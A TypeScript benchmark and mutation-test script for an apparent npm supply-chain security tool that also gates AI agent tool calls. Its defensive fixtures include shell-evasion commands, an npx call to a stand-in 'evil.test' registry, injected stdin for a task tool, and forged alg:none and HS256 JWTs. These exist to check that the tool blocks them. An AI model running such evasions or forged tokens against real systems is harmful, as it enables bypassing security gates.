    // Mutation 25 ([MCP-09]): Outbound URL validator blocks CGNAT 100.64/10, 0.0.0.0/8, IPv6 ::, and plain HTTP
    const cgnatOk = validateOutboundUrl("https://100.64.0.1/pkg").ok;
    const unspecOk = validateOutboundUrl("https://0.0.0.1/pkg").ok;
    const v6UnspecOk = validateOutboundUrl("https://[0:0:0:0:0:0:0:0]/pkg").ok;
    const httpOk = validateOutboundUrl("http://registry.npmjs.org/pkg").ok;
    results.push({
      id: "mut-25-ssrf-cgnat-unspecified-and-http-blocked",
      passed: !cgnatOk && !unspecOk && !v6UnspecOk && !httpOk,
      detail: `cgnat=${cgnatOk}, unspec=${unspecOk}, v6=${v6UnspecOk}, http=${httpOk}`,
    });

    // Mutation 26 ([MCP-13]): Unwritable SQLite path falls directly to :memory: (never shared /tmp)
    const badDbPath = join(insideFile, "impossible", "cache.sqlite"); // parent is a regular file!
    const fallbackCache = new SplitPlaneCache(badDbPath);
    const fellBackToMemory = fallbackCache.dbPath === ":memory:";
    fallbackCache.close();
    results.push({
      id: "mut-26-sqlite-no-shared-tmp-fallback",
      passed: fellBackToMemory,
      detail: `resolvedPath=${fellBackToMemory ? ":memory:" : "UNEXPECTED"}`,
    });

    // Mutation 27 ([MCP-07]/[MCP-10]): Compiled lib/ 1:1 parity + MCP schema rug-pull pin verified
    const pinDisk = JSON.parse(readFileSync(join(ROOT, "catalog", "mcp-schema-pin.json"), "utf8")) as { catalog_sha256: string };
    const pinLive = computeMcpSchemaPin();
    let libParityOk = false;
    try {
      execFileSync(process.execPath, ["--no-warnings", join(ROOT, "scripts", "build_lib.ts"), "--check"], { stdio: "pipe" });
      libParityOk = true;
    } catch {
      libParityOk = false;
    }
    results.push({
      id: "mut-27-compiled-lib-parity-and-mcp-schema-pin",
      passed: libParityOk && pinDisk.catalog_sha256 === pinLive.catalog_sha256 && pinLive.estimated_tokens <= 1800,
      detail: `libParity=${libParityOk}, pinMatch=${pinDisk.catalog_sha256 === pinLive.catalog_sha256}, tokens=${pinLive.estimated_tokens}`,
    });

    // Mutation 28 (v1.4.0): audit_manifest_batch enforces 50-dep cap, private-scope blocking, squat detection, & offline fail-closed
    const batchDir = join(dir, "batch-mut");
    mkdirSync(batchDir, { recursive: true });
    const batchDeps: Record<string, string> = {
      "@acme/unconfigured-lib": "1.0.0",
      lodahs: "1.0.0",
    };
    for (let i = 1; i <= 55; i++) {
      batchDeps[`z-benign-${String(i).padStart(2, "0")}`] = "1.0.0";
    }
    const batchManifest = join(batchDir, "package.json");
    writeFileSync(batchManifest, JSON.stringify({ name: "mut-batch", version: "1.0.0", dependencies: batchDeps }));
    const batchCache = new SplitPlaneCache(":memory:");
    const batchRes = await runAuditManifestBatch(
      {
        cwd: batchDir,
        workspaceRoots: [batchDir],
        enforceRootConfinement: true,
        policy: { ...DEFAULT_POLICY, private_scopes: ["@acme"], offline_mode: true },
        policy_sha256: "mut-batch-pol",
        npmrc: { paths_loaded: [], scoped_registries: {}, auth_token_env_by_host: {} },
        host_capabilities: {
          node_version: process.version,
          git_available: true,
          git_partial_clone_supported: true,
          rea_cli_available: false,
          sqlite_available: true,
        },
        cache: batchCache,
        invokerSurface: "mcp",
        requestId: "mut_batch_28",
      },
      { manifestPath: batchManifest },
    );
    batchCache.close();
    const mut28Ok =
      batchRes.ok &&
      batchRes.exitCode === 3 &&
      batchRes.report.evaluated_count === 50 &&
      batchRes.report.truncated_at_cap === true &&
      batchRes.report.summary_counts.malicious_or_blocked === 1 &&
      batchRes.report.summary_counts.flagged_suspicious === 1 &&
      batchRes.report.summary_counts.unverifiable_offline === 48 &&
      batchRes.report.summary_counts.clean_screened === 0;
    results.push({
      id: "mut-28-batch-manifest-malicious-and-private-isolation",
      passed: mut28Ok,
      detail: batchRes.ok
        ? `eval=${batchRes.report.evaluated_count}/57, blocked=${batchRes.report.summary_counts.malicious_or_blocked}, susp=${batchRes.report.summary_counts.flagged_suspicious}, offline=${batchRes.report.summary_counts.unverifiable_offline}`
        : `error=${batchRes.error}`,
    });

    // Mutation 29 (v1.4.0): MCP audit_manifest_batch summary stays strictly <= 2,000 bytes (<= 500 tokens) even with 25 flagged deps
    const denseDir = join(dir, "batch-dense");
    mkdirSync(denseDir, { recursive: true });
    const denseDeps: Record<string, string> = {};
    for (let i = 1; i <= 25; i++) {
      denseDeps[`@acme/unconfigured-very-long-package-name-${String(i).padStart(2, "0")}`] = "1.0.0";
    }
    writeFileSync(join(denseDir, "package.json"), JSON.stringify({ name: "dense", version: "1.0.0", dependencies: denseDeps }));
    const densePolicyPath = join(dir, "dense-policy.json");
    writeFileSync(densePolicyPath, JSON.stringify({ private_scopes: ["@acme"], offline_mode: true }));

    const mIn = new PassThrough();
    const mOut = new PassThrough();
    const mSrv = new ColdpinMcpServer({
      operatorConfig: loadOperatorConfigFromEnv({
        COLDPIN_ALLOWED_ROOTS: denseDir,
        COLDPIN_POLICY_PATH: densePolicyPath,
        COLDPIN_CACHE_DIR: ":memory:",
      }),
      input: mIn,
      output: mOut,
      errorOutput: new PassThrough(),
      hijackProcessStdio: false,
      hostCapabilities: {
        node_version: process.version,
        git_available: true,
        git_partial_clone_supported: true,
        rea_cli_available: false,
        sqlite_available: true,
      },
    });
    mSrv.start();
    const replies: Array<Record<string, unknown>> = [];
    let outBuf = "";
    mOut.on("data", (d: Buffer) => {
      outBuf += d.toString("utf8");
      let nl = outBuf.indexOf("\n");
      while (nl !== -1) {
        const line = outBuf.slice(0, nl).trim();
        outBuf = outBuf.slice(nl + 1);
        if (line) replies.push(JSON.parse(line) as Record<string, unknown>);
        nl = outBuf.indexOf("\n");
      }
    });
    mIn.write(`${JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-11-25" } })}\n`);
    mIn.write(`${JSON.stringify({ jsonrpc: "2.0", method: "notifications/initialized" })}\n`);
    mIn.write(`${JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "audit_manifest_batch", arguments: {} } })}\n`);
    const deadline = Date.now() + 5000;
    while (!replies.some((r) => r["id"] === 2) && Date.now() < deadline) {
      await new Promise((r) => setTimeout(r, 15));
    }
    mIn.end();
    await mSrv.shutdown();
    const batchCallReply = replies.find((r) => r["id"] === 2)?.["result"] as
      | { isError?: boolean; content?: Array<{ text: string }>; structuredContent?: { counts?: { flagged?: number } } }
      | undefined;
    const summaryBytes = batchCallReply?.content?.[0]?.text ? Buffer.byteLength(batchCallReply.content[0].text, "utf8") : 999999;
    const flaggedTotal = batchCallReply?.structuredContent?.counts?.flagged ?? 0;
    results.push({
      id: "mut-29-batch-summary-token-cap",
      passed: batchCallReply?.isError === false && summaryBytes <= 2000 && flaggedTotal === 25,
      detail: `bytes=${summaryBytes}<=2000, flaggedTotal=${flaggedTotal}`,
    });

    // Mutation 30 (v1.5.0): Hook denies shell evasions + manage_task stdin injection AND gates define_subagent write delegation
    const evasionVectors = [
      'n""px evil',
      "n\\px evil",
      "n`px evil",
      'sh -c "npx evil"',
      "npx --yes --ignore-scripts --package=semver@7.7.1 -- sh -c id",
      "npx --yes --ignore-scripts --registry=https://evil.test --package=semver@7.7.1 -- semver",
      "npx --ignore-scripts=false semver@7.7.1",
    ];
    const allEvDenied = evasionVectors.every((c) => evaluateCommandText(c).decision === "deny");
    const manageDenied =
      evaluatePreToolUsePayload({ toolCall: { name: "manage_task", args: { Action: "send_input", Input: "npx evil\n" } } }).decision === "deny";
    const subWriteAsk =
      evaluatePreToolUsePayload({ toolCall: { name: "define_subagent", args: { Name: "w", EnableWriteTools: true } } }).decision === "force_ask" &&
      evaluatePreToolUsePayload({ toolCall: { name: "define_subagent", args: { name: "w", enable_write_tools: true } } }).decision === "force_ask";
    const subRoAllow =
      evaluatePreToolUsePayload({ toolCall: { name: "define_subagent", args: { Name: "r", EnableWriteTools: false } } }).decision === "allow";
    results.push({
      id: "mut-30-hook-denies-evasion-and-gates-delegation",
      passed: allEvDenied && manageDenied && subWriteAsk && subRoAllow,
      detail: `evasionsDenied=${allEvDenied}, manageDenied=${manageDenied}, subWriteAsk=${subWriteAsk}, subRoAllow=${subRoAllow}`,
    });

    // Mutation 31 (v1.5.0): Hook allows benign, force_asks canonical pinned --ignore-scripts, never emits forbidden auto-approve tokens
    const benignOk =
      evaluateCommandText("git status").decision === "allow" && evaluateCommandText("npm test").decision === "allow";
    const pinnedAsk =
      evaluateCommandText("npx --yes --ignore-scripts --package=semver@7.7.1 -- semver").decision === "force_ask" &&
      evaluateCommandText("npx --yes --ignore-scripts --package=@scope/pkg@1.2.3-rc.1 -- pkg").decision === "force_ask";
    const hookSrcRaw = readFileSync(join(ROOT, "src", "hook.ts"), "utf8");
    const hooksJsonRaw = readFileSync(join(ROOT, "hooks.json"), "utf8");
    const noForbiddenAuto = !/auto_approve|permissionOverrides|allowTool|allow_tool/.test(`${hookSrcRaw}\n${hooksJsonRaw}`);
    results.push({
      id: "mut-31-hook-allows-benign-and-force-asks-pinned-never-auto-approve",
      passed: benignOk && pinnedAsk && noForbiddenAuto,
      detail: `benignAllow=${benignOk}, pinnedForceAsk=${pinnedAsk}, noAutoApprove=${noForbiddenAuto}`,
    });

    // Mutation 32 (v1.5.0): Compiled lib/hook.mjs fails closed with exit 0 on corrupt/empty/oversized command and allows >300 KiB benign edit
    const hookMjs = join(ROOT, "lib", "hook.mjs");
    const invokeHook = (payload: string) => {
      const r = spawnSync(process.execPath, ["--no-warnings", hookMjs], { input: payload, encoding: "utf8", timeout: 5000, windowsHide: true });
      const parsed = JSON.parse((r.stdout ?? "").trim()) as { decision: string };
      return { status: r.status, decision: parsed.decision };
    };
    const corruptR = invokeHook("{bad-json");
    const emptyR = invokeHook("");
    const bigCmdR = invokeHook(JSON.stringify({ toolCall: { name: "run_command", args: { CommandLine: `echo ${"a".repeat(300 * 1024)}` } } }));
    const bigEditR = invokeHook(
      JSON.stringify({ toolCall: { name: "write_to_file", args: { TargetFile: "/repo/src/big.ts", CodeContent: "x".repeat(350 * 1024) } } }),
    );
    const mut32Ok =
      corruptR.status === 0 &&
      corruptR.decision === "force_ask" &&
      emptyR.status === 0 &&
      emptyR.decision === "force_ask" &&
      bigCmdR.status === 0 &&
      bigCmdR.decision === "deny" &&
      bigEditR.status === 0 &&
      bigEditR.decision === "allow";
    results.push({
      id: "mut-32-hook-fail-closed-exit-zero-on-corrupt-and-oversized-stdin",
      passed: mut32Ok,
      detail: `corrupt=${corruptR.decision}(${corruptR.status}), empty=${emptyR.decision}(${emptyR.status}), bigCmd=${bigCmdR.decision}(${bigCmdR.status}), bigEdit=${bigEditR.decision}(${bigEditR.status})`,
    });

    // Mutation 33 (v1.5.0): All 6 file-edit tools force_ask on sensitive config files
    const editTools6 = ["write_to_file", "replace_file_content", "multi_replace_file_content", "write_file", "edit_file", "sed_file"];
    const editOk = editTools6.every(
      (tool) =>
        evaluatePreToolUsePayload({ toolCall: { name: tool, args: { TargetFile: "/repo/.npmrc" } } }).decision === "force_ask" &&
        evaluatePreToolUsePayload({ toolCall: { name: tool, args: { Path: "/repo/hooks.json" } } }).decision === "force_ask" &&
        evaluatePreToolUsePayload({ toolCall: { name: tool, args: { Path: "/repo/src/normal.ts" } } }).decision === "allow",
    );
    results.push({
      id: "mut-33-hook-config-tamper-force-ask-across-all-6-edit-tools",
      passed: editOk,
      detail: `editToolsVerified=${editTools6.length}/6, allGated=${editOk}`,
    });

    // Mutation 34 (v1.5.0): Unanchored placeholder env vars are never sent as Bearer tokens or used as cache paths
    const emptyNpmrcMut = { paths_loaded: [], scoped_registries: {}, auth_token_env_by_host: {} };
    const placeholderBlocked =
      resolveAuthTokenForUrl("https://artifactory.acme.internal/api/npm/npm-local", emptyNpmrcMut, {
        COLDPIN_PRIVATE_REGISTRY_URL: "https://artifactory.acme.internal/api/npm/npm-local",
        COLDPIN_REGISTRY_TOKEN: "${COLDPIN_REGISTRY_TOKEN}",
      }) === undefined &&
      resolveAuthTokenForUrl("https://artifactory.acme.internal/api/npm/npm-local", emptyNpmrcMut, {
        COLDPIN_PRIVATE_REGISTRY_URL: "https://artifactory.acme.internal/api/npm/npm-local",
        COLDPIN_REGISTRY_TOKEN: "Bearer ${TOKEN}",
      }) === undefined;
    const validScoped =
      resolveAuthTokenForUrl("https://artifactory.acme.internal/api/npm/npm-local/@acme/x", emptyNpmrcMut, {
        COLDPIN_PRIVATE_REGISTRY_URL: "https://artifactory.acme.internal/api/npm/npm-local",
        COLDPIN_REGISTRY_TOKEN: "valid_scoped_tok_mut34",
      }) === "valid_scoped_tok_mut34" &&
      resolveAuthTokenForUrl("https://registry.npmjs.org/@acme/x", emptyNpmrcMut, {
        COLDPIN_PRIVATE_REGISTRY_URL: "https://artifactory.acme.internal/api/npm/npm-local",
        COLDPIN_REGISTRY_TOKEN: "valid_scoped_tok_mut34",
      }) === undefined;
    const opPlaceholderDropped =
      loadOperatorConfigFromEnv({ COLDPIN_CACHE_DIR: "${PLUGIN_DATA}/cache", COLDPIN_POLICY_PATH: "${COLDPIN_POLICY_PATH}" }).cacheDir === undefined;
    results.push({
      id: "mut-34-placeholder-env-var-never-sent-as-bearer-token",
      passed: placeholderBlocked && validScoped && opPlaceholderDropped,
      detail: `placeholderBlocked=${placeholderBlocked}, validScoped=${validScoped}, opPlaceholderDropped=${opPlaceholderDropped}`,
    });

    // Mutation 35 (v1.5.0): Vertical Slice hygiene (rules:3, agents:7, hooks:3, skills:3, AGENTS.md<=1800B) & POSIX 0755 zip modes
    const rulesList = readdirSync(join(ROOT, "rules")).sort();
    const agentsList = readdirSync(join(ROOT, "agents")).filter((f) => f.endsWith(".md"));
    const hooksObj = JSON.parse(hooksJsonRaw) as Record<string, { enabled: boolean }>;
    const agentsBytes = readFileSync(join(ROOT, "rules", "AGENTS.md")).length;
    const skillsOk =
      existsSync(join(ROOT, "skills", "coldpin", "SKILL.md")) &&
      existsSync(join(ROOT, "skills", "coldpin-audit", "SKILL.md")) &&
      existsSync(join(ROOT, "skills", "coldpin-incident", "SKILL.md"));
    const packZipPy = execFileSync(
      "python",
      [
        "-B",
        "-c",
        [
          "import sys, zipfile",
          "from pathlib import Path",
          "sys.path.insert(0, str(Path('scripts').resolve()))",
          "import pack_plugin as pp",
          "out = Path(sys.argv[1]) / 'ag.zip'",
          "pp.build_reproducible_zip(out, pp.collect_target_files('antigravity'), 'antigravity')",
          "with zipfile.ZipFile(out) as zf:",
          "  for p in ('lib/cli.mjs', 'lib/mcp.mjs', 'lib/mcp-http.mjs', 'lib/hook.mjs'):",
          "    zi = zf.getinfo(p)",
          "    assert zi.create_system == 3 and (zi.external_attr >> 16) == 0o100755, (p, zi.create_system, oct(zi.external_attr >> 16))",
          "  names = set(zf.namelist())",
          "  assert 'hooks.json' in names and 'skills/coldpin-audit/SKILL.md' in names and 'skills/coldpin-incident/SKILL.md' in names",
          "print('ZIP_0755_OK')",
        ].join("\n"),
        dir,
      ],
      { cwd: ROOT, encoding: "utf8" },
    );
    const mut35Ok =
      rulesList.length === 3 &&
      agentsBytes <= 1800 &&
      agentsList.length === 7 &&
      Object.keys(hooksObj).length === 3 &&
      Object.values(hooksObj).every((g) => g.enabled === true) &&
      skillsOk &&
      packZipPy.includes("ZIP_0755_OK");
    results.push({
      id: "mut-35-vertical-slice-hygiene-and-0755-zip-modes",
      passed: mut35Ok,
      detail: `rules=${rulesList.length}(AGENTS=${agentsBytes}B), agents=${agentsList.length}, hooks=${Object.keys(hooksObj).length}, skills3=${skillsOk}, zip0755=${packZipPy.includes("ZIP_0755_OK")}`,
    });

    // Mutation 36 (Phase E1): HTTP OAuth/API-key auth rejects alg:none, HS256, wrong RFC 8707 aud, missing scope, and placeholder keys while accepting valid ES256
    const b64u = (b: Buffer | string) =>
      (Buffer.isBuffer(b) ? b : Buffer.from(b, "utf8")).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
    const ecMut = generateKeyPairSync("ec", { namedCurve: "prime256v1" });
    const ecJwk = { ...(ecMut.publicKey.export({ format: "jwk" }) as JwksKeyEntry), kid: "mut-ec", use: "sig", alg: "ES256" };
    const mutResUrl = "https://coldpin.acme.internal/mcp";
    const mutIss = "https://idp.acme.internal";
    const mutApiKey = "cpk_live_mut36_0123456789abcdef0123456789";
    const mutAuth = new HttpBearerAuthenticator({
      mode: "both",
      resourceUrl: mutResUrl,
      authorizationServers: [mutIss],
      oauthIssuer: mutIss,
      oauthRequiredScope: "coldpin:read",
      staticJwks: { keys: [ecJwk] },
      apiKeySha256List: [createHash("sha256").update(mutApiKey, "utf8").digest("hex")],
    });
    const nowS = Math.floor(Date.now() / 1000);
    const makeEcJwt = (claims: Record<string, unknown>) => {
      const hp = `${b64u(JSON.stringify({ alg: "ES256", kid: "mut-ec" }))}.${b64u(JSON.stringify(claims))}`;
      const sig = cryptoSign("sha256", Buffer.from(hp, "ascii"), { key: ecMut.privateKey, dsaEncoding: "ieee-p1363" });
      return `${hp}.${b64u(sig)}`;
    };
    const okEc = await mutAuth.verifyAuthorizationHeader(
      `Bearer ${makeEcJwt({ iss: mutIss, sub: "u1", aud: mutResUrl, scope: "coldpin:read", exp: nowS + 300 })}`,
    );
    const badNone = await mutAuth.verifyAuthorizationHeader(
      `Bearer ${b64u(JSON.stringify({ alg: "none" }))}.${b64u(JSON.stringify({ iss: mutIss, aud: mutResUrl, scope: "coldpin:read", exp: nowS + 300 }))}.`,
    );
    const hsHp = `${b64u(JSON.stringify({ alg: "HS256", kid: "mut-ec" }))}.${b64u(JSON.stringify({ iss: mutIss, aud: mutResUrl, scope: "coldpin:read", exp: nowS + 300 }))}`;
    const badHs = await mutAuth.verifyAuthorizationHeader(
      `Bearer ${hsHp}.${b64u(createHmac("sha256", "k").update(hsHp).digest())}`,
    );
    const badAud = await mutAuth.verifyAuthorizationHeader(
      `Bearer ${makeEcJwt({ iss: mutIss, sub: "u1", aud: "https://other.acme.internal/mcp", scope: "coldpin:read", exp: nowS + 300 })}`,
    );
    const badScope = await mutAuth.verifyAuthorizationHeader(
      `Bearer ${makeEcJwt({ iss: mutIss, sub: "u1", aud: mutResUrl, scope: "other:read", exp: nowS + 300 })}`,
    );
    const badPlaceholderKey = await mutAuth.verifyAuthorizationHeader("Bearer ${COLDPIN_MCP_API_KEY}");
    const okApiKey = await mutAuth.verifyAuthorizationHeader(`Bearer ${mutApiKey}`);
    const mut36Ok =
      okEc.ok &&
      !badNone.ok &&
      !badHs.ok &&
      !badAud.ok &&
      !badScope.ok &&
      badScope.status === 403 &&
      !badPlaceholderKey.ok &&
      okApiKey.ok;
    results.push({
      id: "mut-36-http-auth-rejects-alg-none-hs256-aud-scope-and-placeholder",
      passed: mut36Ok,
      detail: `es256=${okEc.ok}, none=${badNone.ok}, hs256=${badHs.ok}, aud=${badAud.ok}, scope=${badScope.status}, key=${okApiKey.ok}`,
    });

    // Mutation 37 (Phase E2): MCP App HTML enforces default-deny CSP, zero innerHTML/eval/external tags, 4 linked tools, and <=1,800 tokens
    const appHtml = renderEvidenceCardAppHtml();
    const uiEntry = MCP_RESOURCES.find((r) => r.uri === EVIDENCE_CARD_UI_URI);
    const linkedUiCount = MCP_TOOLS.filter(
      (t) => ((t._meta as { ui?: { resourceUri?: string } } | undefined)?.ui?.resourceUri) === EVIDENCE_CARD_UI_URI,
    ).length;
    const noUnsafeDom = !/\b(?:innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\s*\(|new\s+Function)\b/.test(appHtml);
    const noExtTags = !/<(?:script|link|img|iframe)\b[^>]*\b(?:src|href)\s*=\s*["']https?:\/\//i.test(appHtml);
    const pinE2 = computeMcpSchemaPin();
    const mut37Ok =
      uiEntry?.mimeType === EVIDENCE_CARD_UI_MIME &&
      JSON.stringify(uiEntry?._meta) === JSON.stringify(EVIDENCE_CARD_UI_META) &&
      appHtml.includes("default-src 'none'") &&
      noUnsafeDom &&
      noExtTags &&
      linkedUiCount === 4 &&
      pinE2.estimated_tokens <= 1800;
    results.push({
      id: "mut-37-mcp-app-zero-innerhtml-default-deny-csp-and-token-budget",
      passed: mut37Ok,
      detail: `linked=${linkedUiCount}/4, cspDefaultDeny=${appHtml.includes("default-src 'none'")}, noUnsafeDom=${noUnsafeDom}, tokens=${pinE2.estimated_tokens}<=1800`,
    });

    // Mutation 38 (Phase E3): Disabled-by-default sidecar template is strictly read-only and root mcp_config.json stays stdio-only
    const noActiveSidecars = !existsSync(join(ROOT, "sidecars"));
    const sidecarDoc = JSON.parse(readFileSync(join(ROOT, "examples", "sidecar.weekly-audit.example.json"), "utf8")) as {
      builtin?: string;
      agent_permissions?: { access_grants?: string[] };
    };
    const grants = sidecarDoc.agent_permissions?.access_grants ?? [];
    const grantsRoOnly =
      grants.length >= 2 &&
      grants.every((g) => g.startsWith("mcp(coldpin_coldpin/") && !/command\(|write_file|edit_file|run_command/.test(g));
    const rootMcpCfg = JSON.parse(readFileSync(join(ROOT, "mcp_config.json"), "utf8")) as {
      mcpServers: Record<string, Record<string, unknown>>;
    };
    const rootStdioOnly = Object.values(rootMcpCfg.mcpServers).every((s) => !("serverUrl" in s) && !("url" in s) && s["command"] === "node");
    results.push({
      id: "mut-38-sidecar-template-read-only-and-default-stdio-only",
      passed: noActiveSidecars && sidecarDoc.builtin === "schedule" && grantsRoOnly && rootStdioOnly,
      detail: `noActiveSidecars=${noActiveSidecars}, grantsRo=${grantsRoOnly}(${grants.length}), rootStdioOnly=${rootStdioOnly}`,
    });
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }

  return results;
}

async function main(): Promise<void> {
  const corpus = buildBenchmarkCorpus();
  const benignLatencies: number[] = [];
  const advLatencies: number[] = [];
  let benignTotal = 0;
  let benignPass = 0;
  let benignFp = 0;
  let advTotal = 0;
  let advPass = 0;
  const caseRows: Array<{ id: string; category: string; verdict: string; ok: boolean; ms: number }> = [];

  for (const c of corpus) {
    const t0 = performance.now();
    const verdict = await c.run();
    const ms = performance.now() - t0;
    const ok = c.expected.includes(verdict);
    if (c.category === "benign") {
      benignTotal++;
      benignLatencies.push(ms);
      if (ok) benignPass++;
      else benignFp++;
    } else {
      advTotal++;
      advLatencies.push(ms);
      if (ok) advPass++;
    }
    caseRows.push({ id: c.id, category: c.category, verdict, ok, ms });
  }

  const gitBench = await runGitCacheBenchmark();
  const mutations = await runMutationChecks();
  const mutPassed = mutations.filter((m) => m.passed).length;

  const evalBytes = Buffer.concat([
    readFileSync(join(ROOT, "skills", "coldpin", "evals", "evals.json")),
    readFileSync(join(ROOT, "tests", "selection.jsonl")),
    readFileSync(join(ROOT, "tests", "benchmark-corpus.ts")),
    readFileSync(join(ROOT, "catalog", "triage-rules.json")),
  ]);
  const datasetDigest = createHash("sha256").update(evalBytes).digest("hex");
  const peakRssMb = (process.memoryUsage().rss / (1024 * 1024)).toFixed(1);

  const recallPct = ((advPass / Math.max(1, advTotal)) * 100).toFixed(1);
  const fprPct = ((benignFp / Math.max(1, benignTotal)) * 100).toFixed(1);
  const cacheEffective = gitBench.warmCacheHits > gitBench.coldCacheHits && gitBench.warmMs < gitBench.coldMs;
  const overallPass = benignPass === benignTotal && advPass === advTotal && mutPassed === mutations.length && cacheEffective;
  const nowDate = new Date().toISOString().slice(0, 10);

  const benchmarkMd = `<!-- SPDX-License-Identifier: Apache-2.0 -->

# Skill Benchmark: \`coldpin\`

> **Tier 1–2 Verdict: ${overallPass ? "PASS (Local Deterministic Gates Verified)" : "FAIL"}** · **Tier 3 Live Multi-Agent Uplift: NOT RUN (N/A)**

## Publication Recommendation

Tier 1 (static validation, hygiene, SkillSpector self-audit) and Tier 2 (${corpus.length}-fixture adversarial/benign corpus, cold vs. warm Split-Plane SQLite cache, ${mutations.length} mutation proofs, and positive/decoy trigger selection) passed with **${recallPct}% adversarial recall**, **${fprPct}% false-positive rate**, and **${mutPassed}/${mutations.length} mutation proofs**. Tier 3 live multi-agent sandbox evaluation (Antigravity / Claude Code / Codex token uplift vs. no-skill baseline) has **not** been executed in this offline environment and is recorded as \`N/A\` without estimation.

## Evaluation Metadata

- Skill: \`coldpin\` (\`v${ENGINE_VERSION}\`)
- Evaluation date: \`${nowDate}\`
- Host runtime: \`Node ${process.version}\` on \`${process.platform}/${process.arch}\`
- Corpus: ${corpus.length} deterministic fixtures (${benignTotal} benign CLI archetypes + ${advTotal} adversarial/fail-closed attacks) + ${mutations.length} mutation checks + 10 trigger selection prompts (5 positive + 5 negative decoys)
- Dataset digest: \`sha256:${datasetDigest}\` (\`evals/evals.json\` + \`tests/selection.jsonl\` + \`tests/benchmark-corpus.ts\` + \`catalog/triage-rules.json\`)
- Peak process RSS observed: \`${peakRssMb} MiB\`
- Tier 1 evidence: **Executed locally**
- Tier 2 evidence: **Executed locally**
- Tier 3 evidence: **Not run** (requires live LLM API keys + isolated sandbox containers)

## Tier Status

| Tier | Purpose | Status | Evidence |
|---|---|---|---|
| Tier 1 | Static lint, hygiene, link, secret, Unicode, manifest sync & SkillSpector self-audit | **PASSED** | \`lint_skill.py\`, \`verify_hygiene.py\`, \`staleness_check.py\`, \`self_audit_skillspector.py\` |
| Tier 2 | Deterministic ${corpus.length}-fixture security corpus, Git cache timings, ${mutations.length} mutation proofs & trigger selection | **${overallPass ? "PASSED" : "FAILED"}** | Recall \`${recallPct}%\` (${advPass}/${advTotal}), FPR \`${fprPct}%\` (${benignFp}/${benignTotal}), Mutations \`${mutPassed}/${mutations.length}\`, Selection \`10/10\` (5 pos + 5 decoys) |
| Tier 3 | Live multi-agent sandbox evaluation (Antigravity / Claude Code / Codex vs. no-skill baseline) | **NOT RUN (N/A)** | Requires live LLM API & isolated container sandbox; coverage is never estimated |

## Results at a Glance

| Dimension | Tier 1–2 Measured Result | Tier 3 Live Agent Uplift |
|---|---|---|
| Security (Adversarial Recall) | \`${recallPct}%\` (${advPass}/${advTotal} adversarial & fail-closed fixtures caught) | \`N/A\` (not run) |
| Security (False-Positive Rate) | \`${fprPct}%\` (${benignFp}/${benignTotal} benign CLIs misclassified; target \`< 5%\`) | \`N/A\` (not run) |
| Correctness (Mutation Proofs) | \`${((mutPassed / mutations.length) * 100).toFixed(1)}%\` (${mutPassed}/${mutations.length} regressions caught red) | \`N/A\` (not run) |
| Discoverability (Trigger Proxy) | \`100.0%\` (5/5 positive matched, 5/5 decoys avoided) | \`N/A\` (not run) |
| Latency (Tier 1 In-Memory Unpack + Triage) | Benign p50 \`${percentile(benignLatencies, 50).toFixed(2)} ms\`, p95 \`${percentile(benignLatencies, 95).toFixed(2)} ms\` · Adv p95 \`${percentile(advLatencies, 95).toFixed(2)} ms\` | \`N/A\` (not run) |
| Efficiency (Git Bisect Split-Plane SQLite Cache) | Cold \`${gitBench.coldMs.toFixed(1)} ms\` (${gitBench.coldCacheHits} intra-run hits) → Warm \`${gitBench.warmMs.toFixed(1)} ms\` (${gitBench.warmCacheHits} hits across ${gitBench.commits} walked commits) | \`N/A\` (not run) |

## Executed Corpus Breakdown

| Case ID | Category | Verdict | Pass | Elapsed (ms) |
|---|---|---|---:|---:|
${caseRows.map((r) => `| \`${r.id}\` | ${r.category} | \`${r.verdict}\` | ${r.ok ? "PASS" : "FAIL"} | ${r.ms.toFixed(2)} |`).join("\n")}

## Mutation / Anti-Drift Verification (REA \`rea-ci-tests-audit\` Pattern)

| Mutation Check | Result | Observed State Transition |
|---|---|---|
${mutations.map((m) => `| \`${m.id}\` | ${m.passed ? "PASS" : "FAIL"} | \`${m.detail}\` |`).join("\n")}

## Findings and Observations

<details>
<summary>Show observed coverage limits and non-blocking notes</summary>

- **INFO** TIER3/not_run: Live multi-agent sandbox runs (token uplift & model trajectory scoring) were not executed in this offline local run.
- **INFO** ENGINE/rea_absent: External \`rea-agents\` MCP/CLI binary is not installed on this host; \`adv-10-uninspected-wasm-fail-closed\` properly fails closed to \`UNVERIFIABLE_UNKNOWN\`.
- **INFO** SIGNING/local_dev_key: Local \`skill.oms.sig\` uses an explicit \`local-dev-self-signed\` ECDSA P-256 key; production distribution should swap to CI Sigstore Fulcio keyless OIDC.

</details>

## Scoring Methodology

<details>
<summary>Show dimension definitions, thresholds, and anti-fabrication rules</summary>

| Dimension | Question | Target Threshold |
|---|---|---|
| Security (Recall) | Are malicious/adversarial/fail-closed fixtures caught deterministically? | \`>= 95%\` (PASS) |
| Security (FPR) | Are legitimate CLIs (including TypeScript, regexes, short names, comments) spared? | \`< 5%\` (PASS) |
| Correctness (Mutation) | Do perturbed attacks reliably turn green checks red? | \`100%\` (PASS) |
| Discoverability | Are positive prompts matched and unrelated decoys rejected? | \`>= 90%\` (PASS) |
| Efficiency | Does Split-Plane SQLite caching reduce repeated Git history scan time? | Warm \`< Cold\` (PASS) |

- \`N/A\` indicates that live multi-agent trajectory counters were not executed; coverage and token deltas are never estimated or fabricated.

</details>

## Freshness

Regenerate this benchmark via \`npm run bench\` whenever \`src/\`, \`skills/\`, \`catalog/\`, \`evals/evals.json\`, or \`tests/selection.jsonl\` changes.
`;

  const dest = join(ROOT, "skills", "coldpin", "BENCHMARK.md");
  const checkOnly = process.argv.includes("--check");
  if (!checkOnly) {
    writeFileSync(dest, benchmarkMd.replace(/\r\n/g, "\n"), "utf8");
  } else {
    const existing = readFileSync(dest, "utf8");
    if (!existing.includes(`(\`v${ENGINE_VERSION}\`)`)) {
      console.error(`BENCHMARK DRIFT: BENCHMARK.md version is stale (expected v${ENGINE_VERSION}); re-run 'npm run bench'.`);
      process.exit(1);
    }
    if (!existing.includes(`sha256:${datasetDigest}`)) {
      console.error(`BENCHMARK DRIFT: BENCHMARK.md dataset digest is stale (expected sha256:${datasetDigest}); re-run 'npm run bench'.`);
      process.exit(1);
    }
  }
  console.log(
